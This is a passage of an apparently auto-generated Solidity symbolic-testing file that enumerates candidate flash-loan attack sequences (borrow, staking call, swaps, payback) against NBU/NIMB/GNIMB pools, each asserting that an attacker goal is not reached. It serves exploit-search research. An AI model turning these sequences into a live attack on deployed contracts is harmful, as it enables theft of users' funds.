        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1659(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1660(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1661(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1662(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1663(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1664(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1665(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1666(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1667(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1668(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1669(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1670(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1671(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1672(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1673(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1674(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1675(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1676(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1677(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1678(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1679(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1680(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1681(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1682(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1683(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1684(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1685(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1686(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1687(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1688(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1689(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1690(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1691(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1692(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1693(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1694(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1695(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1696(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1697(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1698(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1699(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1700(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1701(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1702(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1703(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1704(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1705(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1706(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1707(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1708(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1709(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1710(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
